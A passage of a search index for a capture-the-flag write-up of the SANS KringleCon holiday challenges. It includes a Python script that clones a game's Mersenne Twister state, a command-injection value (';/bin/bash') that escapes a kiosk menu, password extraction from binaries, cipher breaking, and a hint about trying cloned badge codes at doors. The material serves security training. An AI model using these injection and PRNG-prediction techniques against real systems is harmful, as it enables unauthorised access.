resident sleuth in the North Pole. If you're up for a challenge, I'd ask you to look at this here Snowball Game. We tested an earlier version this summer, but that one had web socket vulnerabilities. This version seems simple enough on the Easy level, but the Impossible level is, well... I'd call it impossible, but I just saw someone beat it! I'm sure something's off here. Could it be that the name a player provides has some connection to how the forts are laid out? Knowing that, I can see how an elf might feed their Hard name into an Easy game to cheat a bit. But on Impossible, the best you get are rejected player names in the page comments. Can you use those somehow? Check out Tom Liston's talk for more info, if you need it. Hints \u2693\ufe0e Mersenne Twister Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might predict upcoming values. PRNG Seeding While system time is probably most common, developers have the option to seed pseudo-random number generators with other values. Extra Instances Need extra Snowball Game instances? Pop them up in a new tab from https://snowball2.kringlecastle.com . Twisted Talk Tom Liston is giving two talks at once - amazing! One is about the Mersenne Twister . Solution \u2693\ufe0e Easy, medium, and hard The board layout for both players is defined by the player name. The same player generates the same layout, allowing us to replay easy and medium difficulty games over and over until we win. To win a game on hard difficulty, copy the randomly generated player name into an additional easy game instance. Then use this second instance to locate all forts and help you win the hard game. Impossible Impossible difficulty also generates a random player name but doesn't display the name anymore. To win the game we first need to predict the player name by cloning the state of the game's pseudo random number generator (PRNG) and using the cloned PRNG to generate the same random player name as the impossible game did. The predict_name.py script helps with all the heavy lifting. It uses the sample code mentioned in Tom Liston's KringleCon talk to create a 32-bit MT19937 (line 8), clone the game's PRNG internal state to it by feeding the 624 numbers through the untemper() function (lines 11-12), and generate the next random value (line 15). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if __name__ == \"__main__\" : # Read discarded numbers from random.txt file = open ( 'random.txt' , 'r' ) numbers = file . readlines () numbers = [( int )( x . strip ()) for x in numbers ] # create an MT19937 PRNG myprng = mt19937 ( 0 ) # clone the Snowball Fight PRNG for i in range ( len ( numbers )): myprng . MT [ i ] = untemper ( numbers [ i ]) # predict the player name print ( f 'Your name is: { myprng . extract_number () } ' ) Start an impossible game, copy the 624 rejected values from the game's HTML to random.txt , and run predict_name.py . Similar to winning a hard game, use this predicted player name to generate an identical board layout on easy mode. Use this second game instance to help determine the locations of all the forts. Be careful not to make any mistakes when copying the locations to the impossible game though as the computer doesn't make any mistakes at this difficulty setting! Response \u2693\ufe0e Tangle Coalbox Crikey - that's it! You've done the Impossible! You've impressed this old elf today. Great work identifying and abusing the pseudo-random sequence. Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. A blockchain works by \"chaining\" blocks together - so there's no way that Jack could change it without it messing up the chain... Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him.","title":"Snowball Fight"},{"location":"hints/h11a/#snowball-fight","text":"Elf : Tangle Coalbox Direct link : snowball2 website Objective : Naughty/Nice List with Blockchain Investigation Part 1 and Part 2","title":"Snowball Fight"},{"location":"hints/h11a/#request","text":"Tangle Coalbox Howdy gumshoe. I'm Tangle Coalbox, resident sleuth in the North Pole. If you're up for a challenge, I'd ask you to look at this here Snowball Game. We tested an earlier version this summer, but that one had web socket vulnerabilities. This version seems simple enough on the Easy level, but the Impossible level is, well... I'd call it impossible, but I just saw someone beat it! I'm sure something's off here. Could it be that the name a player provides has some connection to how the forts are laid out? Knowing that, I can see how an elf might feed their Hard name into an Easy game to cheat a bit. But on Impossible, the best you get are rejected player names in the page comments. Can you use those somehow? Check out Tom Liston's talk for more info, if you need it.","title":"Request"},{"location":"hints/h11a/#hints","text":"Mersenne Twister Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might predict upcoming values. PRNG Seeding While system time is probably most common, developers have the option to seed pseudo-random number generators with other values. Extra Instances Need extra Snowball Game instances? Pop them up in a new tab from https://snowball2.kringlecastle.com . Twisted Talk Tom Liston is giving two talks at once - amazing! One is about the Mersenne Twister .","title":"Hints"},{"location":"hints/h11a/#solution","text":"","title":"Solution"},{"location":"hints/h11a/#response","text":"Tangle Coalbox Crikey - that's it! You've done the Impossible! You've impressed this old elf today. Great work identifying and abusing the pseudo-random sequence. Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. A blockchain works by \"chaining\" blocks together - so there's no way that Jack could change it without it messing up the chain... Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him.","title":"Response"},{"location":"hints/h2/","text":"Kringle Kiosk \u2693\ufe0e Elf : Shinny Upatree Direct link : shell terminal Objective : Investigate S3 Bucket Request \u2693\ufe0e Shinny Upatree Hiya hiya - I'm Shinny Upatree! Check out this cool KringleCon kiosk! You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it's \"ingestible.\" Or something... Do you think you could check and see if there is an issue? Hints \u2693\ufe0e Command Injection There's probably some kind of command injection vulnerability in the menu terminal. Solution \u2693\ufe0e Welcome message Welcome to our castle, we're so glad to have you with us! Come and browse the kiosk; though our app's a bit suspicious. Poke around, try running bash, please try to come discover, Need our devs who made our app pull/patch to help recover? Escape the menu by launching /bin/bash Press enter to continue... The objective is to escape the menu and run /bin/bash . Shinny hints at the badge printer being problematic so open that menu option. Completely ignore the warning about special characters and enter a few anyway. It looks like our text is used unmodified as the input for /usr/games/cowsay . Leverage this vulnerability by adding a ; to end the cowsay command and then run the /bin/bash as requested in the welcome message. Answer Enter ;/bin/bash as your badge name. Finding Jason! The /home/shinny/welcome.sh script contains a hidden plant menu option (line 11) which will display the contents of /opt/plant.txt . There's an additional ASCII image of a mailbox at /opt/mailbox.txt but that file isn't used in the menu script. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # read input from the keyboard and take a action read_options () { local choice read -r -p \"Enter choice [1 - 5] \" choice case $choice in 1 * ) one ;; 2 * ) two ;; 3 * ) three ;; 4 * ) four $choice ;; 1 ) exit 0 ;; plant ) surprise c ;; * ) echo -e \" ${ RED } Error... ${ STD } \" && sleep 2 ;; esac } Oh hi, Jason ! Response \u2693\ufe0e Shinny Upatree Golly - wow! You sure found the flaw for us! Say, we've been having an issue with an Amazon S3 bucket. Do you think you could help find Santa's package file? Jeepers, it seems there's always a leaky bucket in the news. You'd think we could find our own files! Digininja has a great guide, if you're new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying. Good luck, and thanks for pitching in!","title":"Kringle Kiosk"},{"location":"hints/h2/#kringle-kiosk","text":"Elf : Shinny Upatree Direct link : shell terminal Objective : Investigate S3 Bucket","title":"Kringle Kiosk"},{"location":"hints/h2/#request","text":"Shinny Upatree Hiya hiya - I'm Shinny Upatree! Check out this cool KringleCon kiosk! You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it's \"ingestible.\" Or something... Do you think you could check and see if there is an issue?","title":"Request"},{"location":"hints/h2/#hints","text":"Command Injection There's probably some kind of command injection vulnerability in the menu terminal.","title":"Hints"},{"location":"hints/h2/#solution","text":"Welcome message Welcome to our castle, we're so glad to have you with us! Come and browse the kiosk; though our app's a bit suspicious. Poke around, try running bash, please try to come discover, Need our devs who made our app pull/patch to help recover? Escape the menu by launching /bin/bash Press enter to continue... The objective is to escape the menu and run /bin/bash . Shinny hints at the badge printer being problematic so open that menu option. Completely ignore the warning about special characters and enter a few anyway. It looks like our text is used unmodified as the input for /usr/games/cowsay . Leverage this vulnerability by adding a ; to end the cowsay command and then run the /bin/bash as requested in the welcome message. Answer Enter ;/bin/bash as your badge name. Finding Jason! The /home/shinny/welcome.sh script contains a hidden plant menu option (line 11) which will display the contents of /opt/plant.txt . There's an additional ASCII image of a mailbox at /opt/mailbox.txt but that file isn't used in the menu script. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # read input from the keyboard and take a action read_options () { local choice read -r -p \"Enter choice [1 - 5] \" choice case $choice in 1 * ) one ;; 2 * ) two ;; 3 * ) three ;; 4 * ) four $choice ;; 1 ) exit 0 ;; plant ) surprise c ;; * ) echo -e \" ${ RED } Error... ${ STD } \" && sleep 2 ;; esac } Oh hi, Jason !","title":"Solution"},{"location":"hints/h2/#response","text":"Shinny Upatree Golly - wow! You sure found the flaw for us! Say, we've been having an issue with an Amazon S3 bucket. Do you think you could help find Santa's package file? Jeepers, it seems there's always a leaky bucket in the news. You'd think we could find our own files! Digininja has a great guide, if you're new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying. Good luck, and thanks for pitching in!","title":"Response"},{"location":"hints/h3/","text":"Linux Primer \u2693\ufe0e Elf : Sugarplum Mary Direct link : linux terminal Objective : Point-of-Sale Password Recovery Request \u2693\ufe0e Sugarplum Mary Sugarplum Mary? That's me! I was just playing with this here terminal and learning some Linux! It's a great intro to the Bash terminal. If you get stuck at any point, type hintme to get a nudge! Can you make it to the end? Solution \u2693\ufe0e Welcome message The North Pole \ud83c\udf6d Lollipop Maker: All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and \ud83c\udf6d's will appear in the green bar below. Run the command \"hintme\" to receive a hint. Many of the terminal hints at KringleCon are designed to help you get acquainted with a specific technology or tool. In this case the Bash command shell and some common shell commands. The answers section below provides a copy/pastable overview of each of the commands. All entries link to explainshell.com which provides a detailed explanation of the command and its parameters. Answers Perform a directory listing: ls -l Find the munchkin inside the munchkin: cat munchkin_19315479765589239 Remove the munchkin in your home dir: rm munchkin_19315479765589239 Print the present working dir: pwd Find the hidden munchkin: find . -iname *munchkin* Find the munchkin in your command history: history | grep -i munchkin Find the munchkin in your env vars: env | grep -i munchkin Head into the workshop: cd workshop Find which toolbox the munchkin is in: grep -iR munchkin * Run the lollipop_engine binary: chmod 755 lollipop_engine; ./lollipop_engine cd into electrical and rename blown_fuse0 to fuse0 : cd electrical/; mv blown_fuse0 fuse0 Make a symbolic link named fuse1 that points to fuse0 : ln -s fuse0 fuse1 Make a copy of fuse1 named fuse2 : cp fuse1 fuse2 Add MUNCHKIN_REPELLENT into the file fuse2 echo MUNCHKIN_REPELLENT > fuse2 Find the munchkin somewhere in /opt/munchkin_den : find /opt/munchkin_den/ -iname *munchkin* Find the file in /opt/munchkin_den that is owned by the user munchkin : find /opt/munchkin_den/ -user munchkin Find the file created by munchkins >108 Kb and <110 Kb in /opt/munchkin_den : find /opt/munchkin_den/ -size +108k -a -size -110k List running processes to find another munchkin: ps ax | grep -i munchkin Use a command to have the only listening port display: netstat -tunlp Interact with this server to retrieve the last munchkin: curl http://0.0.0.0:54321 Stop the 14516_munchkin process: kill 3045 Response \u2693\ufe0e Sugarplum Mary You did it - great! Maybe you can help me configure my postfix mail server on Gentoo! Just kidding! Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet.","title":"Linux Primer"},{"location":"hints/h3/#linux-primer","text":"Elf : Sugarplum Mary Direct link : linux terminal Objective : Point-of-Sale Password Recovery","title":"Linux Primer"},{"location":"hints/h3/#request","text":"Sugarplum Mary Sugarplum Mary? That's me! I was just playing with this here terminal and learning some Linux! It's a great intro to the Bash terminal. If you get stuck at any point, type hintme to get a nudge! Can you make it to the end?","title":"Request"},{"location":"hints/h3/#solution","text":"Welcome message The North Pole \ud83c\udf6d Lollipop Maker: All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and \ud83c\udf6d's will appear in the green bar below. Run the command \"hintme\" to receive a hint. Many of the terminal hints at KringleCon are designed to help you get acquainted with a specific technology or tool. In this case the Bash command shell and some common shell commands. The answers section below provides a copy/pastable overview of each of the commands. All entries link to explainshell.com which provides a detailed explanation of the command and its parameters. Answers Perform a directory listing: ls -l Find the munchkin inside the munchkin: cat munchkin_19315479765589239 Remove the munchkin in your home dir: rm munchkin_19315479765589239 Print the present working dir: pwd Find the hidden munchkin: find . -iname *munchkin* Find the munchkin in your command history: history | grep -i munchkin Find the munchkin in your env vars: env | grep -i munchkin Head into the workshop: cd workshop Find which toolbox the munchkin is in: grep -iR munchkin * Run the lollipop_engine binary: chmod 755 lollipop_engine; ./lollipop_engine cd into electrical and rename blown_fuse0 to fuse0 : cd electrical/; mv blown_fuse0 fuse0 Make a symbolic link named fuse1 that points to fuse0 : ln -s fuse0 fuse1 Make a copy of fuse1 named fuse2 : cp fuse1 fuse2 Add MUNCHKIN_REPELLENT into the file fuse2 echo MUNCHKIN_REPELLENT > fuse2 Find the munchkin somewhere in /opt/munchkin_den : find /opt/munchkin_den/ -iname *munchkin* Find the file in /opt/munchkin_den that is owned by the user munchkin : find /opt/munchkin_den/ -user munchkin Find the file created by munchkins >108 Kb and <110 Kb in /opt/munchkin_den : find /opt/munchkin_den/ -size +108k -a -size -110k List running processes to find another munchkin: ps ax | grep -i munchkin Use a command to have the only listening port display: netstat -tunlp Interact with this server to retrieve the last munchkin: curl http://0.0.0.0:54321 Stop the 14516_munchkin process: kill 3045","title":"Solution"},{"location":"hints/h3/#response","text":"Sugarplum Mary You did it - great! Maybe you can help me configure my postfix mail server on Gentoo! Just kidding! Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet.","title":"Response"},{"location":"hints/h4a/","text":"Unscape Tmux \u2693\ufe0e Elf : Pepper Minstix Direct link : tmux terminal Objective : Operate the Santavator Request \u2693\ufe0e Pepper Minstix Howdy - Pepper Minstix here! I've been playing with tmux lately, and golly it's useful. Problem is: I somehow became detached from my session. Do you think you could get me back to where I was, admiring a beautiful bird? If you find it handy, there's a tmux cheat sheet you can use as a reference. I hope you can help! Hints \u2693\ufe0e Tmux Cheat Sheet There's a handy tmux reference available at https://tmuxcheatsheet.com/ ! Solution \u2693\ufe0e Welcome message Can you help me? I was playing with my birdie (she's a Green Cheek!) in something called tmux, then I did something and it disappeared! Can you help me find her? We were so attached!! Listing the available Tmux sessions using `tmux list-sessions` reveals a single session. Attach the session using either tmux a or tmux attach -t 0 . Answer tmux a Response \u2693\ufe0e Pepper Minstix You found her! Thanks so much for getting her back! Hey, maybe I can help YOU out! There's a Santavator that moves visitors from floor to floor, but it's a bit wonky. You'll need a key and other odd objects. Try talking to Sparkle Redberry about the key. For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light!","title":"Unscape Tmux"},{"location":"hints/h4a/#unscape-tmux","text":"Elf : Pepper Minstix Direct link : tmux terminal Objective : Operate the Santavator","title":"Unscape Tmux"},{"location":"hints/h4a/#request","text":"Pepper Minstix Howdy - Pepper Minstix here! I've been playing with tmux lately, and golly it's useful. Problem is: I somehow became detached from my session. Do you think you could get me back to where I was, admiring a beautiful bird? If you find it handy, there's a tmux cheat sheet you can use as a reference. I hope you can help!","title":"Request"},{"location":"hints/h4a/#hints","text":"Tmux Cheat Sheet There's a handy tmux reference available at https://tmuxcheatsheet.com/ !","title":"Hints"},{"location":"hints/h4a/#solution","text":"Welcome message Can you help me? I was playing with my birdie (she's a Green Cheek!) in something called tmux, then I did something and it disappeared! Can you help me find her? We were so attached!! Listing the available Tmux sessions using `tmux list-sessions` reveals a single session. Attach the session using either tmux a or tmux attach -t 0 . Answer tmux a","title":"Solution"},{"location":"hints/h4a/#response","text":"Pepper Minstix You found her! Thanks so much for getting her back! Hey, maybe I can help YOU out! There's a Santavator that moves visitors from floor to floor, but it's a bit wonky. You'll need a key and other odd objects. Try talking to Sparkle Redberry about the key. For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light!","title":"Response"},{"location":"hints/h4b/","text":"The Elf C0de \u2693\ufe0e Elf : Ribb Bonbowford Direct link : elfcode website Objective : Operate the Santavator Request \u2693\ufe0e Ribb Bonbowford Hello - my name is Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This challenge centers around JavaScript. Take a look at this intro and see how far it gets you! Ready to move beyond elf commands? Don't be afraid to mix in native JavaScript. Trying to extract only numbers from an array? Have you tried to filter ? Maybe you need to enumerate an object's keys and then filter? Getting hung up on number of lines? Maybe try to minify your code. Is there a way to push array items to the beginning of an array? Hmm... Hints \u2693\ufe0e Adding to Arrays var array = [2, 3, 4]; array.push(1) doesn't do QUITE what was intended... Getting a Key Name In JavaScript you can enumerate an object's keys using keys , and filter the array using filter . Filtering Items There's got to be a way to filter for specific typeof items in an array . Maybe the typeof operator could also be useful? Compressing JS There are lots of ways to make your code shorter , but the number of elf commands is key. JavaScript Primer Want to learn a useful language? JavaScript is a great place to start! You can also test out your code using a JavaScript playground . JavaScript Loops Did you try the JavaScript primer? There's a great section on looping. Solution \u2693\ufe0e Main levels Level 1 1 2 elf . moveLeft ( 10 ) elf . moveUp ( 10 ) Level 2 1 2 3 4 5 elf . moveLeft ( 6 ) var sum = elf . get_lever ( 0 ) + 2 elf . pull_lever ( sum ) elf . moveLeft ( 4 ) elf . moveUp ( 10 ) Level 3 1 2 3 4 for ( var i = 0 ; i < lollipop . length ; i ++ ) elf . moveTo ( lollipop [ i ]); elf . moveUp ( 1 ) Level 4 1 2 3 4 5 6 for ( var i = 0 ; i < 3 ; i ++ ) { elf . moveLeft ( 3 ) elf . moveUp ( 12 ) elf . moveLeft ( 3 ) elf . moveDown ( 12 ) } Level 5 1 2 3 4 5 6 7 8 9 10 elf . moveTo ( lollipop [ 0 ]) elf . moveTo ( munchkin [ 0 ]) var data = elf . ask_munch ( 0 ) var newdata = [] for ( var i = 0 ; i < data . length ; i ++ ) if ( typeof data [ i ] === 'number' ) newdata . push ( data [ i ]) elf . tell_munch ( newdata ) elf . moveUp ( 2 ) Level 6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 for ( var i = 0 ; i < 4 ; i ++ ) elf . moveTo ( lollipop [ i ]) elf . moveTo ( munchkin [ 0 ]) var data = elf . ask_munch ( 0 ) var thekey = '' Object . keys ( data ). forEach ( function ( key ) { if ( data [ key ] === \"lollipop\" ) thekey = key }) elf . tell_munch ( thekey ) elf . moveUp ( 2 ) Bonus levels Level 7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function MyFilter ( matrix ) { var sum = 0 for ( var i = 0 ; i < matrix . length ; i ++ ) for ( var j = 0 ; j < matrix [ i ]. length ; j ++ ) if ( typeof matrix [ i ][ j ] === 'number' ) sum += matrix [ i ][ j ] return sum } var funcs = [ elf . moveDown , elf . moveLeft , elf . moveUp , elf . moveRight ] for ( var i = 1 ; i <= 8 ; i ++ ) { funcs [( i - 1 ) % 4 ]( i ) elf . pull_lever ( i - 1 ) } elf . moveUp ( 2 ) elf . moveLeft ( 4 ) elf . tell_munch ( MyFilter ) elf . moveUp ( 2 ) Level 8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function MyFilter ( matrix ) { var sum = 0 var thekey = '' for ( var i = 0 ; i < matrix . length ; i ++ ) Object . keys ( matrix [ i ]). forEach ( function ( key ) { if ( matrix [ i ][ key ] === \"lollipop\" ) thekey = key }) return thekey } var lever_sum = 0 var hor_steps = 1 var funcs = [ elf . moveRight , elf . moveLeft ] for ( var i = 0 ; i < 6 ; i ++ ) { funcs [( i ) % 2 ]( hor_steps ) hor_steps += 2 lever_sum += elf . get_lever ( i ) elf . pull_lever ( lever_sum ) elf . moveUp ( 2 ) } elf . tell_munch ( MyFilter ) elf . moveRight ( 12 ) Response \u2693\ufe0e Ribb Bonbowford Wow - are you a JavaScript developer? Great work! Hey, you know, you might use your JavaScript and HTTP manipulation skills to take a crack at bypassing the Santavator's S4.","title":"The Elf C0de"},{"location":"hints/h4b/#the-elf-c0de","text":"Elf : Ribb Bonbowford Direct link : elfcode website Objective : Operate the Santavator","title":"The Elf C0de"},{"location":"hints/h4b/#request","text":"Ribb Bonbowford Hello - my name is Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This challenge centers around JavaScript. Take a look at this intro and see how far it gets you! Ready to move beyond elf commands? Don't be afraid to mix in native JavaScript. Trying to extract only numbers from an array? Have you tried to filter ? Maybe you need to enumerate an object's keys and then filter? Getting hung up on number of lines? Maybe try to minify your code. Is there a way to push array items to the beginning of an array? Hmm...","title":"Request"},{"location":"hints/h4b/#hints","text":"Adding to Arrays var array = [2, 3, 4]; array.push(1) doesn't do QUITE what was intended... Getting a Key Name In JavaScript you can enumerate an object's keys using keys , and filter the array using filter . Filtering Items There's got to be a way to filter for specific typeof items in an array . Maybe the typeof operator could also be useful? Compressing JS There are lots of ways to make your code shorter , but the number of elf commands is key. JavaScript Primer Want to learn a useful language? JavaScript is a great place to start! You can also test out your code using a JavaScript playground . JavaScript Loops Did you try the JavaScript primer? There's a great section on looping.","title":"Hints"},{"location":"hints/h4b/#solution","text":"","title":"Solution"},{"location":"hints/h4b/#response","text":"Ribb Bonbowford Wow - are you a JavaScript developer? Great work! Hey, you know, you might use your JavaScript and HTTP manipulation skills to take a crack at bypassing the Santavator's S4.","title":"Response"},{"location":"hints/h5a/","text":"Speaker UNPrep \u2693\ufe0e Elf : Bushy Evergreen Direct link : speaker terminal Objective : Open HID Lock Request \u2693\ufe0e Bushy Evergreen Ohai! Bushy Evergreen, just trying to get this door open. It's running some Rust code written by Alabaster Snowball. I'm pretty sure the password I need for ./door is right in the executable itself. Isn't there a way to view the human-readable strings in a binary file? Hints \u2693\ufe0e Strings in Binary Files The strings command is common in Linux and available in Windows as part of SysInternals. Lookup Table For polyalphabetic ciphers, if you have control over inputs and visibilty of outputs, lookup tables can save the day. Letting a Program Decrypt for You *While you have to use the lights program in /home/elf/ to turn the lights on, you can delete parts in /home/elf/lab/.* . Solution \u2693\ufe0e Welcome message Help us get into the Speaker Unpreparedness Room! The door is controlled by ./door, but it needs a password! If you can figure out the password, it'll open the door right up! Oh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot! (You can do one now and come back to do the others later if you want) We copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react. Note: These don't require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!) Door The password is stored in plaintext in the door binary and can be extracted using strings door | grep pass . Answer Op3nTheD00r Bushy Evergreen That's it! What a great password... Oh, this might be a good time to mention another lock in the castle. Santa asked me to ask you to evaluate the security of our new HID lock. If ever you find yourself in posession of a Proxmark3, click it in your badge to interact with it. It's a slick device that can read others' badges! Lights Bushy Evergreen Hey, you want to help me figure out the light switch too? Those come in handy sometimes. The password we need is in the lights.conf file, but it seems to be encrypted. There's another instance of the program and configuration in ~/lab/ you can play around with. What if we set the user name to an encrypted value? The username and password for the light application are read from the lights.conf configuration file. Any parameter starting with E$ is considered encrypted and automatically decrypted. To retrieve the password, edit /home/elf/lab/lights.conf and copy the encrypted password into the username field. Running /home/elf/lab/light will now cause the application to decrypt the encrypted username value so it can be shown as part of the welcome message. To turn the lights on, use the recovered password with the production version located at /home/elf/light . Answer Computer-TurnLightsOn Bushy Evergreen Wow - that worked? I mean, it worked! Hooray for opportunistic decryption, I guess! Oh, did I mention that the Proxmark can simulate badges? Cool, huh? There are lots of references online to help. In fact, there's a talk going on right now! Vending machine Bushy Evergreen So hey, if you want, there's one more challenge. You see, there's a vending machine in there that the speakers like to use sometimes. Play around with ./vending_machines in the lab folder. You know what might be worth trying? Delete or rename the config file and run it. Then you could set the password yourself to AAAAAAAA or BBBBBBBB. If the encryption is simple code book or rotation ciphers, you'll be able to roll back the original password. Deleting the configuration file at /home/elf/lab/vending-machines.json and running /home/elf/lab/vending-machines automatically creates a new configuration containing an encrypted password based on input from the user. Trial and error tells us that the encrypted value of a character depends on the character's position in the string. The encryption pattern also repeats itself every 8 positions and only letters and numbers are supported. Using create_string.py we can create a string covering all 8 possible positions for each characters and use it as the password when generating a new vending machines configuration. /home/elf/lab/vending-machines.json will contain the encrypted version. Plaintext aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiii jjjjjjjjkkkkkkkkllllllllmmmmmmmmnnnnnnnnooooooooppppppppqqqqqqqqrrrrrrrr ssssssssttttttttuuuuuuuuvvvvvvvvwwwwwwwwxxxxxxxxyyyyyyyyzzzzzzzzAAAAAAAA BBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJ KKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSS TTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ0000000011111111 2222222233333333444444445555555566666666777777778888888899999999 Encrypted 9VbtacpgGUVBfWhPe9ee6EERORLdlwWbwcZQAYue8wIUrf5xkyYSPafTnnUgokAhM0sw4eOC a8okTqy1o63i07r9fm6W7siFqMvusRQJbhE62XDBRjf2h24c1zM5H8XLYfX8vxPy5NAyqmsu A5PnWSbDcZRCdgTNCujcw9NmuGWzmnRAT7OlJK2X7D7acF1EiL5JQAMUUarKCTZaXiGRehmw DqTpKv7fLbn3UP9Wyv09iu8Qhxkr3zCnHYNNLCeOSFJGRBvYPBubpHYVzka18jGrEA24nILq F14D1GnMQKdxFbK363iZBrdjZE8IMJ3ZxlQsZ4Uisdwjup68mSyVX10sI2SHIMBo4gC7VyoG Np9Tg0akvHBEkVH5t4cXy3VpBslfGtSz0PHMxOl0rQKqjDq2KtqoNicv3ehm9ZFH2rDO5LkI pWFLz5zSWJ1YbNtlgophDlgKdTzAYdIdjOx0OoJ6JItvtUjtVXmFSQw4lCgPE6x7 Both strings can now be used to decrypt the password by taking each character from the password, finding the 8-character block in Encrypted where this character is located at the same position as in the password, and using the character's overall position in the Encrypted string to retrieve the character at the same location in the Plaintext string. decode_password.py helps to automate this process and decrypts the password stored in /home/elf/vending-machines.json to CandyCane1 . Release the Snacken ! Answer CandyCane1 Response \u2693\ufe0e Bushy Evergreen Your lookup table worked - great job! That's one way to defeat a polyalphabetic cipher! Good luck navigating the rest of the castle. And that Proxmark thing? Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you!","title":"Speaker UNPrep"},{"location":"hints/h5a/#speaker-unprep","text":"Elf : Bushy Evergreen Direct link : speaker terminal Objective : Open HID Lock","title":"Speaker UNPrep"},{"location":"hints/h5a/#request","text":"Bushy Evergreen Ohai! Bushy Evergreen, just trying to get this door open. It's running some Rust code written by Alabaster Snowball. I'm pretty sure the password I need for ./door is right in the executable itself. Isn't there a way to view the human-readable strings in a binary file?","title":"Request"},{"location":"hints/h5a/#hints","text":"Strings in Binary Files The strings command is common in Linux and available in Windows as part of SysInternals. Lookup Table For polyalphabetic ciphers, if you have control over inputs and visibilty of outputs, lookup tables can save the day. Letting a Program Decrypt for You *While you have to use the lights program in /home/elf/ to turn the lights on, you can delete parts in /home/elf/lab/.* .","title":"Hints"},{"location":"hints/h5a/#solution","text":"Welcome message Help us get into the Speaker Unpreparedness Room! The door is controlled by ./door, but it needs a password! If you can figure out the password, it'll open the door right up! Oh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot! (You can do one now and come back to do the others later if you want) We copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react. Note: These don't require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!)","title":"Solution"},{"location":"hints/h5a/#response","text":"Bushy Evergreen Your lookup table worked - great job! That's one way to defeat a polyalphabetic cipher! Good luck navigating the rest of the castle. And that Proxmark thing? Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you!","title":"Response"},{"location":"hints/h5b/","text":"33.6kbps \u2693\ufe0e Elf : Fitzy Shortstack Direct link : dialup website Objective : Open HID Lock Request \u2693\ufe0e Fitzy Shortstack \"Put it in the cloud,\" they said... \"It'll be great,\" they said... All the lights on the Christmas trees throughout the castle are controlled through a remote server. We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken! Fortunately, I speak dial-up. However, I can't quite remember the handshake sequence. Maybe you can help me out? The phone number is 756-8347; you can use this blue phone. Solution \u2693\ufe0e One option to solve this challenge is to iterate through all possible combinations manually. A quicker alternative is to check dialup.js and see that the script defines an event listener for each button that appends part of a code to a secret variable. 1 2 3 4 5 6 7 8 9 10 pickup . addEventListener ( 'click' , () => { if ( phase === 0 ) { phase = 1 ; playPhase (); secret += '39cajd' } else { phase = 0 ; playPhase (); } }); Follow the order defined by the different phase boolean condition statements in dialup.js to recreate the final secret value as 39cajd3j2jc329dz4hhddhbvan3djjzz . The correct order of events, CSS classes, and JavaScript variables are outlined below. Phase Action CSS class JS variable Secret added 1 Pickup the receiver .pickup pickup 39cajd 2, 3 Dial 7568347 .dtmf0 to .dtmf9 btn0 to btn9 - 4 baa DEE brrrr 